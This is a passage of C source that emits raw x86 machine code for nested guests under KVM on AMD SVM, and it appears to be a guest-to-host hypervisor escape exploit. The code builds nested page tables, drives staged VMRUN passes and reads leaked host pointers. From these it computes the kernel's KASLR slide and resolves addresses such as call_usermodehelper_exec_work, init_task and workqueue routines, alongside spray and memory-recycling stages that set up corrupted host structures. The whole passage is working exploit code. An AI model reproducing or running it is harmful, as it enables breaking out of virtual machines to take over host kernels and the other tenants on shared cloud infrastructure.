	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, G1_MARKER + 68u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 160u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, G1_MARKER + 64u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 164u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, G1_MARKER + 68u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 32u);
	e8(&p, 0x3d);
	e32(&p, 1u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 36u);
	e8(&p, 0x3d);
	e32(&p, TARGET_ROLE_INVALID_DIRECT_L1);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 64u);
	e8(&p, 0x3d);
	e32(&p, 1u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 80u);
	e8(&p, 0x0b);
	e8(&p, 0x05);
	e32(&p, TARGET_C_BASE + 84u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 48u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, SAFE_SPT_HVA_LO);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 52u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, SAFE_SPT_HVA_HI);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE);
	e8(&p, 0x3d);
	e32(&p, 0x00000100u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 4u);
	e8(&p, 0x3d);
	e32(&p, 0xdead0000u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 8u);
	e8(&p, 0x3d);
	e32(&p, 0x00000122u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 12u);
	e8(&p, 0x3d);
	e32(&p, 0xdead0000u);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_store_ptr_delta(&p, KS_EXPECT_LO, G1_MARKER + 64u,
			       G1_MARKER + 68u, -24);
	emit32_load_eax(&p, TARGET_C_BASE + 16u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_LO);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 20u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_HI);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_store_ptr_delta(&p, KS_EXPECT_LO, G1_MARKER + 56u,
			       G1_MARKER + 60u, 0x10);
	emit32_load_eax(&p, TARGET_C_BASE + 24u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_LO);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 28u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_HI);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 128u);
	e8(&p, 0x85);
	e8(&p, 0xc0);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 132u);
	e8(&p, 0x85);
	e8(&p, 0xc0);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_store_ptr_delta(&p, KS_EXPECT_LO, G1_MARKER + 64u,
			       G1_MARKER + 68u, -136);
	emit32_load_eax(&p, TARGET_C_BASE + 136u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_LO);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 140u);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, KS_EXPECT_HI);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 144u);
	e8(&p, 0x85);
	e8(&p, 0xc0);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, TARGET_C_BASE + 148u);
	e8(&p, 0x3d);
	e32(&p, TARGET_ROLE_INVALID);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	skip = emit_rel32_jmp(&p);
	fail = p;
	emit32_fail_block(&p, '8');
	done = p;
	for (unsigned int i = 0; i < nbad; i++)
		patch_rel32(bad[i], fail);
	patch_rel32(skip, done);
	emit32_store_ptr_delta(&p, TARGET_C_BASE, G1_MARKER + 64u,
			       G1_MARKER + 68u, -152);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 8u, G1_MARKER + 64u,
			       G1_MARKER + 68u, -152);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 16u, KS_F_LO, KS_F_HI, 0x10);
	emit32_store_imm(&p, TARGET_C_BASE + 128u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 132u, 0);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 136u, KS_F_LO, KS_F_HI,
			       0x10);
	emit32_store_imm(&p, TARGET_C_BASE + 144u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 148u, TARGET_ROLE_INVALID);
	emit32_store_imm(&p, TARGET_C_BASE + 80u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 84u, 0);
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	emit32_store8_imm(&p, KS_C_PRE_E, 'R');
	*pp = p;
}

static void emit64_recycle_pass(uint8_t **pp, uint8_t pass)
{
	uint8_t *p = *pp;

	emit64_wait_byte(&p, KS_PASS_ARM, pass);
	emit64_store_imm(&p, POST_NPT_PDPT + 16u,
			 (uint64_t)KASLR_RECYCLE_PD | 0x7);
	emit_vmrun_h_root_at(&p, POST_NPT_PML4, 0x80001000u);
	emit64_require_h_vmmcall(&p, (uint8_t)('0' + pass));
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, KS_PASS_EXIT);
	e8(&p, pass);
	emit64_wait_byte(&p, KS_PASS_REPAIR, pass);
	emit64_store_imm(&p, POST_NPT_PDPT + 16u, 0);
	emit64_misaligned_child_zap(&p, KASLR_RECYCLE_PD);
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, KS_PASS_FREE);
	e8(&p, pass);
	*pp = p;
}

enum { QA = 1590, QB = 1498, MEMMB = 518 };
static uint32_t npt_pd_addr(unsigned int i)
{
	return i ? NPT_PD_MORE + (i - 1) * 0x1000u : NPT_PD;
}

static void setup_cpuid(int kvm, int vcpu)
{
	size_t b = sizeof(struct kvm_cpuid2) +
		   128 * sizeof(struct kvm_cpuid_entry2);
	struct kvm_cpuid2 *c = calloc(1, b);

	if (!c)
		die("calloc CPUID");
	c->nent = 128;
	if (ioctl(kvm, KVM_GET_SUPPORTED_CPUID, c) < 0)
		die("GET_SUPPORTED_CPUID");
	bool svm = false, npt = false, x2apic = false;

	for (uint32_t i = 0; i < c->nent; i++) {
		if (c->entries[i].function == 1u)
			x2apic |= !!(c->entries[i].ecx & (1u << 21));
		if (c->entries[i].function == 0x80000001u)
			svm |= !!(c->entries[i].ecx & (1u << 2));
		if (c->entries[i].function == 0x8000000au)
			npt |= !!(c->entries[i].edx & 1u);
	}
	if (!svm || !npt || !x2apic) {
		errno = ENOTSUP;
		die("supported CPUID lacks SVM/NPT/x2APIC");
	}
	if (ioctl(vcpu, KVM_SET_CPUID2, c) < 0)
		die("SET_CPUID2");
	free(c);
}

static void set_seg(struct vmcb_seg *s, uint32_t attr)
{
	s->selector = 0;
	s->attrib = attr;
	s->limit = 0xffffffffu;
	s->base = 0;
}

static void emit_touch_loop(uint8_t **lp, int cnt)
{
	uint8_t *l = *lp;

	if (cnt <= 0)
		return;
	*l++ = 0xb9;
	*(uint32_t *)l = (uint32_t)cnt;
	l += 4;
	*l++ = 0x8b;
	*l++ = 0x03;
	*l++ = 0x81;
	*l++ = 0xc3;
	*(uint32_t *)l = 0x200000;
	l += 4;
	*l++ = 0x49;
	*l++ = 0x75;
	*l++ = 0xf5;
	*lp = l;
}

static void emit_l2_phase_a(void)
{
	uint8_t *l = M + L2_CODE;
	*l++ = 0xb9;
	*(uint32_t *)l = (uint32_t)QA;
	l += 4;
	*l++ = 0x89;
	*l++ = 0x0d;
	*(uint32_t *)l = 0x1004;
	l += 4;
	*l++ = 0xa1;
	*(uint32_t *)l = 0x1000;
	l += 4;
	*l++ = 0xbb;
	*(uint32_t *)l = 0x00200000u;
	l += 4;
	emit_touch_loop(&l, 56);
	*l++ = 0xbb;
	*(uint32_t *)l = 0x40000000u;
	l += 4;
	emit_touch_loop(&l, 512);
	*l++ = 0xbb;
	*(uint32_t *)l = 0x80000000u;
	l += 4;
	emit_touch_loop(&l, 512);
	*l++ = 0xbb;
	*(uint32_t *)l = 0xc0000000u;
	l += 4;
	emit_touch_loop(&l, 511);
	*l++ = 0x89;
	*l++ = 0x1d;
	*(uint32_t *)l = 0x1008;
	l += 4;
	*l++ = 0xc6;
	*l++ = 0x05;
	*(uint32_t *)l = 0x1803;
	l += 4;
	*l++ = 'A';
	uint8_t *wait = l;
	*l++ = 0x80;
	*l++ = 0x3d;
	*(uint32_t *)l = 0x1802;
	l += 4;
	*l++ = 'R';
	*l++ = 0x74;
	*l++ = 0x04;
	*l++ = 0xf3;
	*l++ = 0x90;
	int8_t back = (int8_t)(wait - (l + 2));
	*l++ = 0xeb;
	*l++ = (uint8_t)back;
	*l++ = 0x0f;
	*l++ = 0x01;
	*l++ = 0xd9;
	*l++ = 0xf4;
}

static void emit_l2_phase_b(void)
{
	uint8_t *l = M + L2_CODE + 0x400;
	*l++ = 0xb9;
	*(uint32_t *)l = (uint32_t)QB;
	l += 4;
	*l++ = 0x89;
	*l++ = 0x0d;
	*(uint32_t *)l = 0x1004;
	l += 4;
	*l++ = 0xa1;
	*(uint32_t *)l = 0x1000;
	l += 4;
	*l++ = 0xbb;
	*(uint32_t *)l = 0x200000;
	l += 4;
	emit_touch_loop(&l, 57);
	*l++ = 0x8b;
	*l++ = 0x03;
	*l++ = 0xc6;
	*l++ = 0x05;
	*(uint32_t *)l = 0x1800;
	l += 4;
	*l++ = 'C';
	uint8_t *wait_clear = l;
	*l++ = 0x80;
	*l++ = 0x3d;
	*(uint32_t *)l = 0x1801;
	l += 4;
	*l++ = 'D';
	*l++ = 0x74;
	*l++ = 0x04;
	*l++ = 0xf3;
	*l++ = 0x90;
	int8_t wait_clear_back = (int8_t)(wait_clear - (l + 2));
	*l++ = 0xeb;
	*l++ = (uint8_t)wait_clear_back;
	*l++ = 0x89;
	*l++ = 0x1d;
	*(uint32_t *)l = 0x1008;
	l += 4;
	*l++ = 0xc6;
	*l++ = 0x05;
	*(uint32_t *)l = 0x1804;
	l += 4;
	*l++ = 'T';
	*l++ = 0x0f;
	*l++ = 0x01;
	*l++ = 0xd9;
	*l++ = 0xf4;
}

static void build_l2(void)
{
	emit_l2_phase_a();
	emit_l2_phase_b();
	*(uint32_t *)(M + L2_DATA) = 0xdeadbeef;
	*(uint32_t *)(M + L2_QUOTA_BK) = 0x11111111;
}

static void emit_vmrun_root_at(uint8_t **pp, uint32_t nested_cr3,
			       uint32_t nested_rip)
{
	uint8_t *p = *pp;

	e8(&p, 0x48);
	e8(&p, 0xb8);
	e64(&p, nested_cr3);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_VMCB + offsetof(struct vmcb_control_area, nested_cr3));
	e8(&p, 0x48);
	e8(&p, 0xb8);
	e64(&p, nested_rip);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_VMCB + offsetof(struct vmcb, save) +
			offsetof(struct vmcb_save_area, rip));
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_VMCB + offsetof(struct vmcb_control_area, clean));
	e8(&p, 0x48);
	e8(&p, 0xb8);
	e64(&p, G1_VMCB);
	e8(&p, 0x0f);
	e8(&p, 0x01);
	e8(&p, 0xd8);
	*pp = p;
}

static void emit_vmrun_root(uint8_t **pp, uint32_t nested_cr3)
{
	emit_vmrun_root_at(pp, nested_cr3, 0);
}

static void emit_vmrun_h_root_at(uint8_t **pp, uint32_t nested_cr3,
				 uint32_t nested_rip)
{
	uint8_t *p = *pp;

	e8(&p, 0x48);
	e8(&p, 0xb8);
	e64(&p, nested_cr3);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, H_G1_VMCB + offsetof(struct vmcb_control_area, nested_cr3));
	e8(&p, 0x48);
	e8(&p, 0xb8);
	e64(&p, nested_rip);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, H_G1_VMCB + offsetof(struct vmcb, save) +
			offsetof(struct vmcb_save_area, rip));
	e8(&p, 0x48);
	e8(&p, 0x31);
	e8(&p, 0xc0);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, H_G1_VMCB + offsetof(struct vmcb_control_area, clean));
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, H_G1_VMCB + offsetof(struct vmcb_control_area, exit_code));
	e8(&p, 0x48);
	e8(&p, 0xb8);
	e64(&p, H_G1_VMCB);
	e8(&p, 0x0f);
	e8(&p, 0x01);
	e8(&p, 0xd8);
	*pp = p;
}

static void emit64_require_h_vmmcall(uint8_t **pp, uint8_t stage)
{
	uint8_t *p = *pp;

	e8(&p, 0x81);
	e8(&p, 0x3c);
	e8(&p, 0x25);
	e32(&p, H_G1_VMCB + offsetof(struct vmcb_control_area, exit_code));
	e32(&p, 0x81);
	e8(&p, 0x74);
	e8(&p, 0x0c);
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, SPRAY_ARM + 48u);
	e8(&p, stage);
	emit_fail_stop_loop(&p);
	*pp = p;
}

static void emit_kaslr_post_code(uint8_t **pp)
{
	uint8_t *p = *pp;

	emit64_store_imm(&p, 0x28u, 0xa7u);
	emit64_wait_byte(&p, KS_M_READY, 'R');
	emit_vmrun_h_root_at(&p, POST_NPT_PML4, 0x380u);
	emit64_require_h_vmmcall(&p, 'M');
	e8(&p, 0x48);
	e8(&p, 0xa1);
	e64(&p, TARGET_P1_PTR);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_MARKER + 56u);
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, SPRAY_ARM + 15u);
	e8(&p, 'M');
	emit64_wait_byte(&p, SPRAY_ARM + 16u, 'A');
	emit64_store_imm(&p, NPT_PML4, (uint64_t)NPT_PDPT | 0x7);
	for (unsigned int i = 0; i < 4; i++)
		emit64_store_imm(&p, NPT_PDPT + i * 8u,
				 (uint64_t)npt_pd_addr(i) | 0x7);
	for (unsigned int pd = 0; pd < 4; pd++) {
		for (unsigned int i = 0; i < 3; i++) {
			unsigned int k = pd * 512u + i;
			uint32_t pt = k ? NPT_PT_POOL + (k - 1u) * 0x1000u :
					  NPT_PT0;
			emit64_store_imm(&p, npt_pd_addr(pd) + i * 8u,
					 (uint64_t)pt | 0x7);
		}
		{
			unsigned int k = pd * 512u + 511u;
			uint32_t pt = NPT_PT_POOL + (k - 1u) * 0x1000u;

			emit64_store_imm(&p, npt_pd_addr(pd) + 511u * 8u,
					 (uint64_t)pt | 0x7);
		}
	}
	emit64_store_imm(&p, NPT_PT0, (uint64_t)POST_L2_CODE | 0x7);
	emit_vmrun_h_root_at(&p, NPT_PML4, 0);
	emit64_require_h_vmmcall(&p, 'B');
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, SPRAY_ARM + 17u);
	e8(&p, 'B');
	emit64_store_imm(&p, H_NPT_PML4, (uint64_t)H_NPT_PDPT | 0x7);
	emit64_store_imm(&p, H_NPT_PDPT, (uint64_t)H_NPT_PD0 | 0x7);
	emit64_store_imm(&p, H_NPT_PDPT + 8u, (uint64_t)H_NPT_PD1 | 0x7);
	for (unsigned int pd = 0; pd < 2; pd++) {
		for (unsigned int i = 0; i < 3; i++) {
			unsigned int k = pd * 512u + i;
			uint32_t pt = k ? H_NPT_PT_POOL + (k - 1u) * 0x1000u :
					  H_NPT_PT0;
			uint32_t raw_pd = pd ? H_NPT_PD1 : H_NPT_PD0;

			emit64_store_imm(&p, raw_pd + i * 8u,
					 (uint64_t)pt | 0x7);
		}
	}
	emit64_store_imm(&p, H_NPT_PD0 + 511u * 8u,
			 (uint64_t)(H_NPT_PT_POOL + (511u - 1u) * 0x1000u) |
				 0x7);
	emit64_store_imm(&p, H_NPT_PT0, (uint64_t)POST_L2_CODE | 0x7);
	emit_vmrun_h_root_at(&p, H_NPT_PML4, 0x100u);
	emit64_require_h_vmmcall(&p, 'L');
	e8(&p, 0x48);
	e8(&p, 0xa1);
	e64(&p, TARGET_C_BASE + 152u);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_MARKER + 64u);
	e8(&p, 0x48);
	e8(&p, 0xa1);
	e64(&p, TARGET_C_BASE + 160u);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_MARKER + 72u);
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, SPRAY_ARM + 18u);
	e8(&p, 'L');
	emit64_wait_byte(&p, SPRAY_ARM + 19u, 'R');
	emit64_wait_byte(&p, KS_PASS_ARM, 2);
	emit_vmrun_h_root_at(&p, H_NPT_PML4, 0x200u);
	emit64_require_h_vmmcall(&p, '2');
	e8(&p, 0x48);
	e8(&p, 0xa1);
	e64(&p, TARGET_C_BASE + 152u);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_MARKER + 80u);
	e8(&p, 0x48);
	e8(&p, 0xa1);
	e64(&p, TARGET_C_BASE + 160u);
	e8(&p, 0x48);
	e8(&p, 0xa3);
	e64(&p, G1_MARKER + 88u);
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, SPRAY_ARM + 22u);
	e8(&p, 'S');
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, KS_PASS_EXIT);
	e8(&p, 2);
	emit64_wait_byte(&p, KS_PASS_REPAIR, 2);
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, KS_PASS_FREE);
	e8(&p, 2);
	emit64_recycle_pass(&p, 3);
	emit64_recycle_pass(&p, 4);
	emit64_recycle_pass(&p, 5);
	emit64_recycle_pass(&p, 6);
	emit64_recycle_pass(&p, 7);
	emit64_recycle_pass(&p, 8);
	emit64_wait_byte(&p, KS_PAGING_OFF, 'U');
	emit64_wait_byte(&p, KS_C_PRE_E, 'A');
	emit_vmrun_h_root_at(&p, POST_NPT_PML4, 0x300u);
	emit64_require_h_vmmcall(&p, 'E');
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, KS_E_READY);
	e8(&p, 'E');
	emit64_wait_byte(&p, KS_TRACK_REQ, 1);
	emit_vmrun_h_root_at(&p, POST_NPT_PML4, 0x300u);
	emit64_require_h_vmmcall(&p, 'x');
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, KS_TRACK_ACK);
	e8(&p, 1);
	emit64_wait_byte(&p, KS_TRACK_REQ, 2);
	emit_vmrun_h_root_at(&p, POST_NPT_PML4, 0x300u);
	emit64_require_h_vmmcall(&p, 'y');
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, KS_TRACK_ACK);
	e8(&p, 2);
	emit64_wait_byte(&p, KS_STATUS, 'S');
	emit64_wait_byte(&p, KS_ACTIVATION_ARM, 'A');
	emit64_wait_byte(&p, KS_TRACK_REQ, 3);
	emit_vmrun_h_root_at(&p, POST_NPT_PML4, 0x300u);
	emit64_require_h_vmmcall(&p, 'u');
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, KS_TRACK_ACK);
	e8(&p, 3);
	emit64_wait_byte(&p, KS_TRACK_REQ, 4);
	emit_vmrun_h_root_at(&p, POST_NPT_PML4, 0x300u);
	emit64_require_h_vmmcall(&p, 'v');
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, KS_TRACK_ACK);
	e8(&p, 4);
	emit64_wait_byte(&p, KS_SPLICE_READY, 'L');
	emit64_wait_byte(&p, KS_WORK_QUEUED, 'Q');
	e8(&p, 0xc6);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, SPRAY_ARM + 20u);
	e8(&p, 'P');
	e8(&p, 0xf4);
	*pp = p;
}

static void emit32_require_distinct_pages(uint8_t **pp, uint8_t stage)
{
	uint8_t *p = *pp, *different, *same_hi, *skip, *fail, *done;

	emit32_load_eax(&p, SAFE_SPT_HVA_LO);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, HOST_HVA_LO);
	different = emit_rel32_jcc(&p, 0x85);
	emit32_load_eax(&p, SAFE_SPT_HVA_HI);
	e8(&p, 0x3b);
	e8(&p, 0x05);
	e32(&p, HOST_HVA_HI);
	same_hi = emit_rel32_jcc(&p, 0x84);
	patch_rel32(different, p);
	skip = emit_rel32_jmp(&p);
	fail = p;
	emit32_fail_block(&p, stage);
	done = p;
	patch_rel32(same_hi, fail);
	patch_rel32(skip, done);
	*pp = p;
}

static void emit32_require_n_qword_zero(uint8_t **pp, uint8_t stage)
{
	uint8_t *p = *pp, *bad, *skip, *fail, *done;

	e8(&p, 0x8b);
	e8(&p, 0x3d);
	e32(&p, KS_N_GPA);
	e8(&p, 0x8b);
	e8(&p, 0x87);
	e32(&p, 0x208u);
	e8(&p, 0x0b);
	e8(&p, 0x87);
	e32(&p, 0x20cu);
	bad = emit_rel32_jcc(&p, 0x85);
	skip = emit_rel32_jmp(&p);
	fail = p;
	emit32_fail_block(&p, stage);
	done = p;
	patch_rel32(bad, fail);
	patch_rel32(skip, done);
	*pp = p;
}

static void emit32_store_slid_symbol(uint8_t **pp, uint32_t dst, uint64_t base)
{
	uint8_t *p = *pp;

	emit32_load_eax(&p, KS_SLIDE);
	e8(&p, 0x05);
	e32(&p, (uint32_t)base);
	emit32_store_eax(&p, dst);
	e8(&p, 0xb8);
	e32(&p, (uint32_t)(base >> 32));
	e8(&p, 0x83);
	e8(&p, 0xd0);
	e8(&p, 0x00);
	emit32_store_eax(&p, dst + 4u);
	*pp = p;
}

static void emit32_finish_p_leak(uint8_t **pp)
{
	uint8_t *p = *pp, *bad[5], *skip, *fail, *done;

	e8(&p, 0x8b);
	e8(&p, 0x3d);
	e32(&p, KS_N_GPA);
	e8(&p, 0x8b);
	e8(&p, 0x87);
	e32(&p, 0x208u);
	e8(&p, 0x8b);
	e8(&p, 0x97);
	e32(&p, 0x20cu);
	e8(&p, 0x81);
	e8(&p, 0xfa);
	e32(&p, 0xffffffffu);
	bad[0] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x89);
	e8(&p, 0xc1);
	e8(&p, 0x81);
	e8(&p, 0xe1);
	e32(&p, 0xfffu);
	e8(&p, 0x81);
	e8(&p, 0xf9);
	e32(&p, (uint32_t)(RCU_PM_NB_LINK & 0xfffull));
	bad[1] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x8b);
	e8(&p, 0x87);
	e32(&p, 0x208u);
	emit32_store_eax(&p, KS_P_LO);
	e8(&p, 0x8b);
	e8(&p, 0x97);
	e32(&p, 0x20cu);
	e8(&p, 0x89);
	e8(&p, 0x15);
	e32(&p, KS_P_HI);
	e8(&p, 0xc7);
	e8(&p, 0x87);
	e32(&p, 0x208u);
	e32(&p, 0);
	e8(&p, 0xc7);
	e8(&p, 0x87);
	e32(&p, 0x20cu);
	e32(&p, 0);
	emit32_load_eax(&p, KS_P_LO);
	e8(&p, 0x8b);
	e8(&p, 0x15);
	e32(&p, KS_P_HI);
	e8(&p, 0x2d);
	e32(&p, (uint32_t)RCU_PM_NB_LINK);
	e8(&p, 0x81);
	e8(&p, 0xda);
	e32(&p, (uint32_t)(RCU_PM_NB_LINK >> 32));
	e8(&p, 0x81);
	e8(&p, 0xfa);
	e32(&p, 0);
	bad[2] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x3d);
	e32(&p, KASLR_IMAGE_MAX);
	bad[3] = emit_rel32_jcc(&p, 0x83);
	e8(&p, 0x89);
	e8(&p, 0xc1);
	e8(&p, 0x81);
	e8(&p, 0xe1);
	e32(&p, 0x1fffffu);
	bad[4] = emit_rel32_jcc(&p, 0x85);
	emit32_store_eax(&p, KS_SLIDE);
	emit32_store_slid_symbol(&p, KS_LOG_LO, LOG_WAIT_HEAD);
	emit32_store_slid_symbol(&p, KS_SRCU_LO, SRCU_DELAY_TIMER);
	emit32_store_slid_symbol(&p, KS_UMH_LO, CALL_USERMODEHELPER_EXEC_WORK);
	emit32_store_slid_symbol(&p, KS_ZERO_LO, EMPTY_ZERO_PAGE);
	emit32_store_slid_symbol(&p, KS_WORK_NOOP_LO, WORKQUEUE_NOOP);
	emit32_store_slid_symbol(&p, KS_EP_AUTOREMOVE_LO, EP_AUTOREMOVE_WAKE);
	emit32_store_slid_symbol(&p, KS_INIT_TASK_LO, INIT_TASK_SYMBOL);
	emit32_store8_imm(&p, KS_STATUS, 'S');
	skip = emit_rel32_jmp(&p);
	fail = p;
	emit32_fail_block(&p, 's');
	done = p;
	for (unsigned int i = 0; i < 5; i++)
		patch_rel32(bad[i], fail);
	patch_rel32(skip, done);
	*pp = p;
}

static void emit_kaslr_helper_code(uint8_t **pp)
{
	uint8_t *p = *pp;

	emit32_wait_byte(&p, SPRAY_ARM + 15u, 'M');
	emit32_load_eax(&p, G1_MARKER + 36u);
	e8(&p, 0x25);
	e32(&p, 0xffff0000u);
	e8(&p, 0x3d);
	e32(&p, 0xffff0000u);
	uint8_t *n_ok = emit_rel32_jcc(&p, 0x84);

	emit32_fail_block(&p, 'N');
	patch_rel32(n_ok, p);
	emit32_load_eax(&p, G1_MARKER + 32u);
	e8(&p, 0x25);
	e32(&p, 0xfffff000u);
	emit32_store_eax(&p, SAFE_SPT_HVA_LO);
	emit32_load_eax(&p, G1_MARKER + 36u);
	emit32_store_eax(&p, SAFE_SPT_HVA_HI);
	emit32_store_ptr_delta(&p, KS_K_LO, G1_MARKER + 40u, G1_MARKER + 44u,
			       -(int32_t)KVM_ACTIVE_HEAD_OFF);
	emit32_store_ptr_delta(&p, KS_F_LO, G1_MARKER + 40u, G1_MARKER + 44u,
			       (int32_t)KVM_F_FROM_H);
	emit32_store_ptr_delta(&p, TARGET_C_BASE, G1_MARKER + 56u,
			       G1_MARKER + 60u, 0);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 8u, G1_MARKER + 40u,
			       G1_MARKER + 44u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 32u, 0x01ff0000u);
	emit32_store_imm(&p, TARGET_C_BASE + 36u,
			 TARGET_ROLE_INVALID_DIRECT_L1);
	emit32_store_imm(&p, TARGET_C_BASE + 40u, 0);
	emit32_store_imm(&p, TARGET_C_BASE + 44u, 0);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 48u, SAFE_SPT_HVA_LO,
			       SAFE_SPT_HVA_HI, 0);
	for (uint32_t off = 56u; off < 152u; off += 4u)
		emit32_store_imm(&p, TARGET_C_BASE + off, 0);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 80u, G1_MARKER + 40u,
			       G1_MARKER + 44u, -0x80);
	emit32_load_eax(&p, TARGET_C_BASE + 80u);
	e8(&p, 0x83);
	e8(&p, 0xc8);
	e8(&p, 0x02);
	emit32_store_eax(&p, TARGET_C_BASE + 80u);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 152u, G1_MARKER + 40u,
			       G1_MARKER + 44u, KVM_PSEUDO_FROM_H);
	emit32_store_ptr_delta(&p, TARGET_C_BASE + 160u, KS_F_LO, KS_F_HI,
			       0x10);
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	emit32_store8_imm(&p, SPRAY_ARM + 16u, 'A');
	emit32_wait_byte(&p, SPRAY_ARM + 17u, 'B');
	e8(&p, 0xb9);
	e32(&p, 50000000u);
	uint8_t *hold = p;

	e8(&p, 0xf3);
	e8(&p, 0x90);
	e8(&p, 0xff);
	e8(&p, 0xc9);
	uint8_t *hold_more = emit_rel32_jcc(&p, 0x85);

	patch_rel32(hold_more, hold);
	emit32_store_imm(&p, TARGET_C_BASE + 64u, 1);
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	emit32_store_ptr_delta(&p, KS_EXPECT_LO, G1_MARKER + 40u,
			       G1_MARKER + 44u, -0x80);
	emit32_load_eax(&p, KS_EXPECT_LO);
	e8(&p, 0x89);
	e8(&p, 0xc3);
	e8(&p, 0x83);
	e8(&p, 0xc8);
	e8(&p, 0x02);
	e8(&p, 0x8b);
	e8(&p, 0x15);
	e32(&p, KS_EXPECT_HI);
	e8(&p, 0x8b);
	e8(&p, 0x0d);
	e32(&p, KS_EXPECT_HI);
